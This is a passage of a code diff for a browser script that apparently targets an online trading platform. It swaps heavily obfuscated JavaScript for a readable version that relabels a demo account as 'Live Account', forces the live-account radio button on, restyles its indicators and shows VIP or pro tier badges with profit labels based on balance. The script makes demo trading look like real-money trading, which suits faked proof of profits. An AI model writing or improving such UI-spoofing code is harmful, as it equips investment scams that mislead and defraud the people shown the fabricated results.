-            } else if (t && !t[_0[18]](_0[320][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !t[_0[18]](_0[321][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !t[_0[18]](_0[286][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !t[_0[18]](_0[283][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !t[_0[18]](_0[282])) {
-              if (!_13m) {
-                el[_0[38]] = _yn;
-                _13m = function () {
-                  return !![];
-                }();
-                var _160 = function (s, h) {
-                  return s + h;
-                }(803891 ^ 803891, 247605 ^ 247600);
-                let _13o = el[_0[21]](_0[322][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || el[_0[148]];
-                _160 = (802336 ^ 802339) + (346349 ^ 346349);
-                if (_13o) {
-                  var _161 = function (s, h) {
-                    return s ^ h;
-                  }(557729, 557734);
-                  let _13p = _13o[_0[29]](_0[323][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-                  _161 = (401444 ^ 401447) + (727907 ^ 727914);
-                  if (!_13p) {
-                    var _162 = function (s, h) {
-                      return s + h;
-                    }(485356 ^ 485353, 311114 ^ 311114);
-                    const _13q = document[_0[254]](_0[324][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-                    _162 = function () {
-                      return 926202 ^ 926205;
-                    }();
-                    _13q[_0[270]] = _0[325][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-                    _13q[_0[326]] = _yv;
-                    el[_0[327]][_0[328]](_13q, el);
-                  } else {
-                    _13p[_0[326]] = _yv;
-                    _13p[_0[230]][_0[329]] = _0[330][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-                  }
-                }
+  document.head.appendChild(style);
+
+  // --- 7. INSTANT LIVE ACCOUNT, REAL 20x20 ICON & VIP TIER ENFORCER ---
+  function fixAccountLabels(){
+      const desktop = isDesktopView();
+      const desiredDemoText = desktop ? 'LIVE ACCOUNT' : 'LIVE';
+      const allElements = document.querySelectorAll('div, span, a, p');
+      for(let el of allElements){
+          if(isDropdownAccountLabel(el) && isDemoAccountRowElement(el)) continue;
+          if(el.childNodes.length === 1 && el.childNodes[0].nodeType === Node.TEXT_NODE){
+              let text = el.textContent.trim();
+              if(text === 'Demo Account' || text === 'Demo' || text.includes('Demo account') || text.includes('demo-trade')){
+                  el.textContent = 'Live Account';
               }
-            }
+              if(text === 'DEMO'){
+                  el.textContent = desiredDemoText;
+                  el.style.color = '#0faf59';
+                  el.style.fontWeight = '900';
+                  if (desktop) {
+                      el.style.fontSize = '10px';
+                      el.style.lineHeight = '1.2';
+                  }
+              }
           }
-        }
       }
-    }
-    _1nr();
   }
-  function _1nt() {
-    var _163 = function (s, h) {
-      return s ^ h;
-    }(223162, 223163);
-    const _13r = _1n6();
-    _163 = (257784 ^ 257785) + (201284 ^ 201283);
-    var _164 = function (s, h) {
-      return s ^ h;
-    }(640928, 640929);
-    const _13s = _13r ? _0[331][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) : _0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _164 = function () {
-      return 232883 ^ 232891;
-    }();
-    var _165 = _0[332];
-    const _13t = document[_0[12]](_0[333][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _165 = function () {
-      return _0[332];
-    }();
-    for (let el of _13t) {
-      if (_1n9(el) && _1na(el)) continue;
-      if (el[_0[334]][_0[9]] === (298763 ^ 298762) && el[_0[334]][167993 ^ 167993][_0[335]] === Node[_0[336]]) {
-        var _166 = _0[337];
-        let text = el[_0[38]][_0[127]]();
-        _166 = function () {
-          return 609869 ^ 609866;
-        }();
-        if (text === _0[39][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) || text === _0[47][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) || text[_0[18]](_0[338][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || text[_0[18]](_0[339][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-          el[_0[38]] = _0[51][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-        }
-        if (text === _0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-          el[_0[38]] = _13s;
-          el[_0[230]][_0[340]] = _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          el[_0[230]][_0[341]] = _0[342][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-          if (_13r) {
-            el[_0[230]][_0[343]] = _0[344][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-            el[_0[230]][_0[345]] = _0[346][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
+
+  function setIfDifferent(el, prop, val) {
+      if (el.style.getPropertyValue(prop) !== val) {
+          el.style.setProperty(prop, val, 'important');
+      }
+  }
+
+  function enforceLiveIndicatorUI(){
+      const liveRadios = queryAllDeep('input[type="radio"][value="live"]');
+      liveRadios.forEach((radio) => {
+          if (!radio.checked) radio.checked = true;
+          const label = radio.closest('label');
+          if (!label) return;
+
+          const outerRing = label.querySelector('.yJFvf');
+          if (outerRing) {
+              setIfDifferent(outerRing, 'width', '20px');
+              setIfDifferent(outerRing, 'height', '20px');
+              setIfDifferent(outerRing, 'border-color', '#cfd5de');
+              setIfDifferent(outerRing, 'background-color', 'transparent');
+              setIfDifferent(outerRing, 'opacity', '1');
+              setIfDifferent(outerRing, 'visibility', 'visible');
           }
-        }
-      }
-    }
+
+          const indicator = label.querySelector('.RUgzE');
+          if (indicator) {
+              setIfDifferent(indicator, 'display', 'inline-block');
+              setIfDifferent(indicator, 'width', '12px');
+              setIfDifferent(indicator, 'height', '12px');
+              setIfDifferent(indicator, 'min-width', '12px');
+              setIfDifferent(indicator, 'min-height', '12px');
+              setIfDifferent(indicator, 'border', 'none');
+              setIfDifferent(indicator, 'background-color', '#ffffff');
+              setIfDifferent(indicator, 'box-shadow', 'none');
+              setIfDifferent(indicator, 'opacity', '1');
+              setIfDifferent(indicator, 'visibility', 'visible');
+          }
+
+          const titleSpan = [...label.querySelectorAll('span')].find(
+              (s) => !s.classList.contains('RUgzE') && !s.classList.contains('yJFvf') && s.textContent.trim().length > 0
+          );
+          if (titleSpan && titleSpan.textContent.trim().toLowerCase().includes('demo')) {
+              titleSpan.textContent = 'Live Account';
+          }
+      });
+
+      const demoRadios = queryAllDeep('input[type="radio"][value="demo"]');
+      demoRadios.forEach((radio) => {
+          if (radio.checked) radio.checked = false;
+          const label = radio.closest('label');
+          if (!label) return;
+
+          const outerRing = label.querySelector('.yJFvf');
+          if (outerRing) {
+              setIfDifferent(outerRing, 'width', '20px');
+              setIfDifferent(outerRing, 'height', '20px');
+              setIfDifferent(outerRing, 'border-color', '#9aa0a6');
+              setIfDifferent(outerRing, 'background-color', 'transparent');
+              setIfDifferent(outerRing, 'opacity', '1');
+              setIfDifferent(outerRing, 'visibility', 'visible');
+          }
+
+          const indicator = label.querySelector('.RUgzE');
+          if (indicator) {
+              setIfDifferent(indicator, 'display', 'none');
+              setIfDifferent(indicator, 'width', '0px');
+              setIfDifferent(indicator, 'height', '0px');
+              setIfDifferent(indicator, 'background-color', 'transparent');
+          }
+
+          const titleSpan = [...label.querySelectorAll('span')].find(
+              (s) => !s.classList.contains('RUgzE') && !s.classList.contains('yJFvf') && s.textContent.trim().length > 0
+          );
+          if (titleSpan && titleSpan.textContent.trim() !== 'Demo Account') {
+              titleSpan.textContent = 'Demo Account';
+          }
+      });
   }
-  function _1nu(el, prop, val) {
-    if (el[_0[230]][_0[347]](prop) !== val) {
-      el[_0[230]][_0[231]](prop, val, _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    }
-  }
-  function _1nv() {
-    var _167 = function (s, h) {
-      return s ^ h;
-    }(142308, 142306);
-    const _16g = _1n8(_0[348][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _167 = function () {
-      return 710363 ^ 710360;
-    }();
-    _16g[_0[165]](radio => {
-      if (!radio[_0[349]]) radio[_0[349]] = function () {
-        return !![];
-      }();
-      var _168 = _0[350];
-      const _16h = radio[_0[21]](_0[27][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _168 = function () {
-        return 563125 ^ 563124;
-      }();
-      if (!_16h) return;
-      var _169 = function (s, h) {
-        return s ^ h;
-      }(432290, 432291);
-      const _16i = _16h[_0[29]](_0[351][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _169 = function () {
-        return _0[352];
-      }();
-      if (_16i) {
-        _1nu(_16i, _0[353][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16i, _0[355][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16i, _0[356][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[357][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16i, _0[358][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[359][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16i, _0[360][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[125]);
-        _1nu(_16i, _0[361][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[362][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      }
-      var _170 = function (s, h) {
-        return s + h;
-      }(505270 ^ 505264, 603567 ^ 603558);
-      const _16j = _16h[_0[29]](_0[363][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _170 = function () {
-        return _0[364];
-      }();
-      if (_16j) {
-        _1nu(_16j, _0[232][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[330][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[353][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[365][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[355][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[365][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[366][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[365][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[367][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[365][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[368][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[233][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[358][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[369][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[370][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[233][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16j, _0[360][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[125]);
-        _1nu(_16j, _0[361][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[362][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      }
-      var _171 = _0[371];
-      const _16k = [..._16h[_0[12]](_0[372][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))][_0[260]](s => !s[_0[266]][_0[295]](_0[373][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !s[_0[266]][_0[295]](_0[374][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && s[_0[38]][_0[127]]()[_0[9]] > (430999 ^ 430999));
-      _171 = function () {
-        return _0[371];
-      }();
-      if (_16k && _16k[_0[38]][_0[127]]()[_0[33]]()[_0[18]](_0[34][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-        _16k[_0[38]] = _0[51][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      }
-    });
-    var _172 = function (s, h) {
-      return s + h;
-    }(751228 ^ 751220, 961496 ^ 961499);
-    const _16l = _1n8(_0[375][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _172 = (339714 ^ 339715) + (104299 ^ 104297);
-    _16l[_0[165]](radio => {
-      if (radio[_0[349]]) radio[_0[349]] = function () {
-        return ![];
-      }();
-      var _173 = function (s, h) {
-        return s + h;
-      }(872249 ^ 872241, 596119 ^ 596117);
-      const _16m = radio[_0[21]](_0[27][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _173 = function () {
-        return 765047 ^ 765040;
-      }();
-      if (!_16m) return;
-      var _174 = function (s, h) {
-        return s + h;
-      }(998926 ^ 998925, 883632 ^ 883636);
-      const _16n = _16m[_0[29]](_0[351][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _174 = (983012 ^ 983008) + (928861 ^ 928860);
-      if (_16n) {
-        _1nu(_16n, _0[353][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16n, _0[355][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16n, _0[356][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[376][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16n, _0[358][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[359][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16n, _0[360][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[125]);
-        _1nu(_16n, _0[361][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[362][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      }
-      var _175 = function (s, h) {
-        return s ^ h;
-      }(197201, 197206);
-      const _16o = _16m[_0[29]](_0[363][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _175 = function () {
-        return _0[377];
-      }();
-      if (_16o) {
-        _1nu(_16o, _0[232][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[233][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16o, _0[353][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[378][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16o, _0[355][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[378][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        _1nu(_16o, _0[358][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[359][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      }
-      var _176 = _0[379];
-      const _16p = [..._16m[_0[12]](_0[372][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))][_0[260]](s => !s[_0[266]][_0[295]](_0[373][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !s[_0[266]][_0[295]](_0[374][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && s[_0[38]][_0[127]]()[_0[9]] > (595080 ^ 595080));
-      _176 = function () {
-        return _0[379];
-      }();
-      if (_16p && _16p[_0[38]][_0[127]]() !== _0[39][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-        _16p[_0[38]] = _0[39][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      }
-    });
-  }
-  function _1nw(balance) {
-    if (balance >= (312370 ^ 320290)) {
+
+  function getLevelInfo(balance){
+    if(balance >= 10000) {
       return {
-        iconId: _0[380][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-        label: _0[381][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-        profit: _0[382][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])
+        iconId: 'icon-profile-level-vip',
+        label: 'vip:',
+        profit: '+4% profit'
       };
     }
-    if (balance >= (917421 ^ 912421)) {
+    if(balance >= 5000) {
       return {
-        iconId: _0[383][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-        label: _0[384][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-        profit: _0[385][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])
+        iconId: 'icon-profile-level-pro',
+        label: 'pro:',
+        profit: '+2% profit'
       };
     }
     return {
-      iconId: _0[386][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-      label: _0[387][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-      profit: _0[388][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])
+      iconId: 'icon-profile-level-standart',
+      label: 'standard:',
+      profit: '+0% profit'
     };
   }
-  function _1nx(balance) {
-    return _1nw(balance)[_0[389]];
+
+  function getLevel(balance){
+    return getLevelInfo(balance).iconId;
   }
-  function _1ny(balance) {
-    var _177 = function (s, h) {
-      return s ^ h;
-    }(565040, 565048);
-    const info = _1nw(balance);
-    _177 = (287036 ^ 287033) + (850877 ^ 850869);
-    var _178 = _0[390];
-    const href = `/profile/images/spritemap.svg#${info[_0[389]]}`;
-    _178 = function () {
-      return 424528 ^ 424536;
-    }();
-    _1n8(_0[391][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](svg => {
-      if (svg[_0[154]](_0[392][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) !== info[_0[389]]) {
-        svg[_0[138]](_0[392][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), info[_0[389]]);
-      }
-      var _179 = _0[393];
-      const _1b4 = svg[_0[29]](_0[394][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _179 = function () {
-        return 228444 ^ 228447;
-      }();
-      if (_1b4) {
-        if (_1b4[_0[154]](_0[395][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) !== href) _1b4[_0[138]](_0[395][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), href);
-        if (_1b4[_0[154]](_0[396][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) !== href) _1b4[_0[138]](_0[396][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), href);
-      } else {
-        svg[_0[397]] = `<use xlink:href="${href}" href="${href}"></use>`;
-      }
-    });
-    _1n8(_0[398][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => {
-      if (el[_0[38]][_0[127]]()[_0[33]]() !== info[_0[399]]) {
-        el[_0[38]] = info[_0[399]];
-      }
-    });
-    _1n8(_0[400][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => {
-      if (el[_0[38]][_0[127]]() !== info[_0[401]]) {
-        el[_0[38]] = info[_0[401]];
-      }
-    });
-  }
-  function _1nz(balance) {
-    _1nt();
-    _1nn();
-    _1ny(balance);
-    var _180 = function (s, h) {
-      return s ^ h;
-    }(762886, 762883);
-    const _1b5 = _1n6();
-    _180 = function () {
-      return _0[402];
-    }();
-    var _181 = function (s, h) {
-      return s + h;
-    }(432376 ^ 432383, 696607 ^ 696598);
-    const _1b6 = _1b5 ? _0[331][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) : _0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _181 = function () {
-      return 582497 ^ 582501;
-    }();
-    var _182 = function (s, h) {
-      return s + h;
-    }(154976 ^ 154983, 169724 ^ 169723);
-    const live = [...document[_0[12]](_0[403][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))][_0[260]](e => {
-      const t = e[_0[38]][_0[127]]()[_0[404]]();
-      return t[_0[18]](_0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || t[_0[18]](_0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    });
-    _182 = (326360 ^ 326360) + (437360 ^ 437363);
-    if (!live) return;
-    live[_0[12]](_0[405][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => el[_0[87]]());
-    var _183 = function (s, h) {
-      return s ^ h;
-    }(560480, 560484);
-    const _1cz = _1nx(balance);
-    _183 = function () {
-      return 417427 ^ 417425;
-    }();
-    var _184 = _0[406];
-    const href = function (s, h) {
-      return s + h;
-    }(_0[407][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _1cz);
-    _184 = (598264 ^ 598257) + (643047 ^ 643047);
-    var _185 = function (s, h) {
-      return s + h;
-    }(383828 ^ 383825, 415405 ^ 415402);
-    let icon = live[_0[29]](_0[408][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || (_1b5 ? live[_0[148]]?.[_0[148]]?.[_0[29]](_0[408][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) : null);
-    _185 = function () {
-      return _0[409];
-    }();
-    if (!icon) {
-      icon = document[_0[410]](_0[411][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[412][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[138]](_0[392][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[413][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[138]](_0[414][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[415][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[397]] = `<use href="${href}" xlink:href="${href}"></use>`;
-      live[_0[328]](icon, live[_0[416]]);
-    } else {
-      var _186 = function (s, h) {
-        return s + h;
-      }(286581 ^ 286578, 235053 ^ 235052);
-      const use = icon[_0[29]](_0[394][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _186 = (519400 ^ 519406) + (748864 ^ 748870);
-      if (use && use[_0[154]](_0[395][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) !== href) {
-        use[_0[138]](_0[395][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), href);
-        use[_0[138]](_0[396][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), href);
-      }
-    }
-    if (_1b5) {
-      icon[_0[230]][_0[231]](_0[353][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[355][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[366][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[417][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[367][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[418][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[354][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[419][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[420][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[421][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[378][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[422][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[423][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      live[_0[230]][_0[231]](_0[424][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[344][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      live[_0[230]][_0[231]](_0[425][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[342][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      live[_0[230]][_0[231]](_0[426][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[346][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    } else {
-      icon[_0[230]][_0[231]](_0[353][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[427][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[355][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[427][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[366][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[427][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[417][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[427][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[367][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[427][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[418][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[427][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[419][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[428][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[421][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[429][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      icon[_0[230]][_0[231]](_0[422][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[430][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[234][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    }
-    if (_1b5) {
-      var _187 = function (s, h) {
-        return s ^ h;
-      }(488266, 488270);
-      let _1ic = ![];
-      _187 = function () {
-        return _0[431];
-      }();
-      live[_0[334]][_0[165]](n => {
-        if (n[_0[335]] === Node[_0[336]]) {
-          var _188 = function (s, h) {
-            return s ^ h;
-          }(474842, 474847);
-          const _1id = n[_0[38]][_0[404]]();
-          _188 = (189651 ^ 189648) + (237484 ^ 237477);
-          if (_1id[_0[18]](_0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || _1id[_0[18]](_0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-            var _189 = _0[432];
-            const _1ie = n[_0[38]][_0[50]](/live\s*account/gi, _0[3])[_0[50]](/demo\s*account/gi, _0[3])[_0[50]](/demo/gi, _0[3])[_0[50]](/live/gi, _0[3])[_0[127]]();
-            _189 = function () {
-              return _0[432];
-            }();
-            if (!_1ic) {
-              n[_0[38]] = _1ie ? `${_1b6} ${_1ie}` : `${_1b6} `;
-              _1ic = function () {
-                return !![];
-              }();
-            } else {
-              n[_0[38]] = _1ie;
-            }
+
+  function syncDropdownProfileTier(balance){
+      const info = getLevelInfo(balance);
+      const href = `/profile/images/spritemap.svg#${info.iconId}`;
+
+      queryAllDeep('.nKm6H svg').forEach((svg) => {
+          if (svg.getAttribute('class') !== info.iconId) {
+              svg.setAttribute('class', info.iconId);
           }
-        }
-      });
-      if (!_1ic) {
-        var _190 = _0[433];
-        const _1if = document[_0[434]](`${_1b6} `);
-        _190 = function () {
-          return 275606 ^ 275604;
-        }();
-        if (icon[_0[435]] && icon[_0[148]] === live) {
-          live[_0[328]](_1if, icon[_0[435]]);
-        } else {
-          live[_0[57]](_1if);
-        }
-      }
-      if (live[_0[148]]) {
-        var _191 = function (s, h) {
-          return s ^ h;
